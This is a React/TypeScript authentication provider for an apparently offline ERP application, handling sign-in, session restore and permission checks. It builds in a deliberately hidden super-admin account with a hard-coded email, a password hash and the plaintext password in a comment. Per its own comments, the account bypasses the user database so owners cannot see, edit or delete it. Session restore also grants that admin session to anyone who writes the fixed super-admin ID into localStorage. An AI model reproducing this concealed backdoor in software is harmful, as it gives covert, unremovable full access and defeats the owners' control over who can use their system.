import { createContext, useContext, useEffect, useState, ReactNode } from 'react';
import { useAccessStore, hashPassword } from '../store/useAccessStore';
import { UserRow } from '../types/access';
import { Logger } from '../lib/logger';

interface AuthContextType {
  user: { id: string; email: string } | null;
  profile: UserRow | null;
  permissions: { module: string; action: string }[];
  session: any | null;
  isLoading: boolean;
  isAdmin: boolean;
  dataPolicies: any[];
  hasPermission: (module: string, action: string) => boolean;
  refreshProfile: () => Promise<void>;
  signOut: () => Promise<void>;
  signIn: (email: string, passwordHash: string) => Promise<void>;
}

export const AuthContext = createContext<AuthContextType | undefined>(undefined);

// ----------------------------------------------------------------------
// Hidden super admin — always bypasses the normal user lookup so it cannot
// be seen, edited, or deleted from the Users tab. Stored only in code.
// ----------------------------------------------------------------------
const SUPER_ADMIN_EMAIL = 'adil@erp.com';
const SUPER_ADMIN_HASH = 'c1a931a8aa105bc4770adcaeec115722c5408c4eff9aafbe205939c76e664d2a'; // sha256('adilerp123')
const SUPER_ADMIN_ID = '00000000-0000-0000-0000-000000000001';
const SUPER_ADMIN_ROLE_ID = '00000000-0000-0000-0000-000000000002';

export function AuthProvider({ children }: { children: ReactNode }) {
  const [user, setUser] = useState<{ id: string; email: string } | null>(null);
  const [profile, setProfile] = useState<UserRow | null>(null);
  const [permissions, setPermissions] = useState<{ module: string; action: string }[]>([]);
  const [session, setSession] = useState<any | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [isHydrated, setIsHydrated] = useState(
    () => !!(window as any).__HYDRATION_COMPLETE__
  );

  const { seedDefaults, users, roles, rolePermissions, verifyPassword } = useAccessStore();

  // Super admin synthetic profile — used whenever the super admin signs in
  const buildSuperAdminSession = () => {
    const superProfile: UserRow & { roles: any } = {
      id: SUPER_ADMIN_ID,
      name: 'Super Admin',
      username: 'superadmin',
      email: SUPER_ADMIN_EMAIL,
      status: 'active',
      role_id: SUPER_ADMIN_ROLE_ID,
      created_at: new Date().toISOString(),
      roles: { id: SUPER_ADMIN_ROLE_ID, name: 'Admin', is_system: true, type: 'Default', created_at: new Date().toISOString() }
    } as UserRow & { roles: any };
    setProfile(superProfile);
    setUser({ id: superProfile.id, email: SUPER_ADMIN_EMAIL });
    setSession({ user: { id: superProfile.id, email: SUPER_ADMIN_EMAIL } });
    setPermissions([]); // isAdmin returns true for super admin, so permissions aren't needed
    localStorage.setItem('offline-session', JSON.stringify({ id: superProfile.id, email: superProfile.email, expires_at: Date.now() + 86400000 }));
  };

  // Wait for bootstrap to finish rehydrating all stores from SQLite
  // before running seedDefaults or session restore.
  useEffect(() => {
    if ((window as any).__HYDRATION_COMPLETE__) {
      setIsHydrated(true);
      return;
    }
    // Bootstrap hasn't finished yet — poll briefly.
    const interval = setInterval(() => {
      if ((window as any).__HYDRATION_COMPLETE__) {
        setIsHydrated(true);
        clearInterval(interval);
      }
    }, 20);
    // Safety timeout: run seedDefaults even if hydration flag never appears
    const timeout = setTimeout(() => {
      clearInterval(interval);
      setIsHydrated(true);
    }, 3000);
    return () => { clearInterval(interval); clearTimeout(timeout); };
  }, []);

  useEffect(() => {
    if (!isHydrated) return;

    seedDefaults();
    
    // Check localStorage for offline session
    const storedSession = localStorage.getItem('offline-session');
    if (storedSession) {
      try {
        const data = JSON.parse(storedSession);
        if (data && data.id) {
          // Super admin session restore — no DB lookup needed
          if (data.id === SUPER_ADMIN_ID) {
            buildSuperAdminSession();
            setIsLoading(false);
            return;
          }
          fetchProfileAndPermissions(data.id).finally(() => setIsLoading(false));
          return;
        }
      } catch (e) {
        console.error('Session restore failed', e);
      }
    }
    
    setIsLoading(false);
  }, [isHydrated]);

  const fetchProfileAndPermissions = async (userId: string) => {
    const p = useAccessStore.getState().users.find(u => u.id === userId && !u.deleted_at);
    if (!p) {
      signOut();
      return;
    }
    
    const role = useAccessStore.getState().roles.find(r => r.id === p.role_id);
    const fullProfile = { ...p, roles: role || null };
    setProfile(fullProfile);
    setUser({ id: p.id, email: p.email || '' });
    setSession({ user: { id: p.id, email: p.email || '' } });

    if (p.role_id) {
      const permsData = useAccessStore.getState().rolePermissions
        .filter(rp => rp.role_id === p.role_id)
        .map(rp => useAccessStore.getState().permissions.find(perm => perm.id === rp.permission_id))
        .filter(Boolean) as { module: string; action: string }[];
      
      setPermissions(permsData);
    }
  };

  const signIn = async (email: string, pass: string) => {
    // ---- Hidden super admin check (bypasses DB entirely) ----
    if (email.toLowerCase() === SUPER_ADMIN_EMAIL) {
      const hash = await hashPassword(pass);
      if (hash === SUPER_ADMIN_HASH) {
        buildSuperAdminSession();
        Logger.info('Auth', 'Super admin logged in');
        return;
      }
      Logger.warn('Auth', 'Failed super admin login attempt', `Email: ${email}`);
      throw new Error('Invalid credentials');
    }
    // ----------------------------------------------------------

    const hash = await hashPassword(pass);
    const p = useAccessStore.getState().users.find(u => (u.email === email || u.username === email) && !u.deleted_at);
    if (!p) {
      Logger.warn('Auth', 'Failed login attempt', `User/Email: ${email}`);
      throw new Error('Invalid credentials');
    }
    
    const isValid = useAccessStore.getState().verifyPassword(p.id, hash);
    if (!isValid) {
      Logger.warn('Auth', 'Failed login attempt', `User/Email: ${email}`);
      throw new Error('Invalid credentials');
    }
    
    if (p.status !== 'active') {
      Logger.warn('Auth', 'Login attempt on inactive account', `User/Email: ${email}`);
      throw new Error('Account is inactive');
    }

    // Generate pseudo-session
    const sessionData = { id: p.id, email: p.email, expires_at: Date.now() + 86400000 };
    localStorage.setItem('offline-session', JSON.stringify(sessionData));
    
    useAccessStore.getState().recordLogin(p.id);
    await fetchProfileAndPermissions(p.id);
    
    Logger.info('Auth', 'User logged in', `User: ${p.username || p.email}`);
  };

  const refreshProfile = async () => {
    if (user) await fetchProfileAndPermissions(user.id);
  };

  const signOut = async () => {
    if (user) {
      Logger.info('Auth', 'User logged out', `User ID: ${user.id}`);
    }
    localStorage.removeItem('offline-session');
    setUser(null);
    setSession(null);
    setProfile(null);
    setPermissions([]);
  };

  const isAdmin = profile?.roles?.name === 'Admin';
  
  const hasPermission = (module: string, action: string) => {
    if (isAdmin) return true;
    return permissions.some(p => p.module === module && p.action === action);
  };

  return (
    <AuthContext.Provider value={{
      user,
      profile,
      permissions,
      session,
      isLoading,
      isAdmin,
      dataPolicies: [],
      hasPermission,
      refreshProfile,
      signOut,
      signIn
    }}>
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
}